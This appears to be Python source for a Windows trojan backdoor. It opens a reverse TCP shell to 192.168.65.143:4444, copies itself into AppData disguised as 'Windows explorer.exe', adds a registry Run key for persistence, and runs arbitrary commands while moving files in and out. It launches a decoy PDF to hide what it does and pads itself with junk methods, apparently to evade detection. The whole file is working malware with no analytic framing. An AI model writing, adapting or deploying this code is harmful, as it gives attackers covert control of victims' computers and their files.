#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class BK_Door_proj:

    def __init__(self, ip, port):
        self.con_status = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.con_status.connect((ip, port))
        self.execute_com = ""
        self.open_on_startup()


    #------------------------------------start of disposable methods------------------------------

    def add_com(self):
        print("not usable")

    def sub_com(self):
        catch = "c"
        batch = "b"
        if "a" == "a":
            print("b")
        elif catch == batch:
            print("equal")

    def desp_method(self):
        sort = ["yahya" , "khaled" , "omar"]
        result = ""
        for element in sort :
            i = 0
            j = 1
            if element[i]>element[j] and len(sort)>j:
                result = element[i]
                j += 1
            elif len(sort) > j:
                result = element[j]
                i += 1

    #-----------------------------end of desposable methods-------------------------------------------



    def open_on_startup(self):
        loc = os.environ["appdata"] + "\\Windows explorer.exe"
        if not os.path.exists(loc):
            shutil.copyfile(sys.executable, loc)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + loc + '"',shell=True)

    def reliable_send(self, d):
        json_d = json.dumps(d)
        self.con_status.send(json_d.encode())

    def reliable_recv(self):
        json_d = b""
        while True:
            try:
                json_d += self.con_status.recv(1024)
                return json.loads(json_d)
            except ValueError:
                continue

    def change_directory(self, path):
        os.chdir(path)
        return "[+] changing path to " + path

    def do_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin = subprocess.DEVNULL)

    def read_f(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_f(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] upload successful"

    def run(self):
        while True:
            self.execute_com = self.reliable_recv()
            try:
                if self.execute_com[0] == "exit":
                    self.con_status.close()
                    sys.exit()
                elif self.execute_com[0] == "cd" and len(self.execute_com) > 1:
                    com_res = self.change_directory(self.execute_com[1])
                elif self.execute_com[0] == "download":
                    com_res = self.read_f(self.execute_com[1]).decode()
                elif self.execute_com[0] == "upload":
                    com_res = self.write_f(self.execute_com[1], self.execute_com[2])
                else:
                    com_res = self.do_command(self.execute_com[0]).decode()
                self.reliable_send(com_res)
            except Exception:
                com_res = "[-] Error occured!"
                self.reliable_send(com_res)


fn= sys._MEIPASS + "\Animal.pdf"
subprocess.Popen(fn , shell=True)
try:
    if True:
        run = BK_Door_proj("192.168.65.143", 4444)
        run.run()
    else:
        print("this print message will never be executed :) !")


except Exception:
    sys.exit()
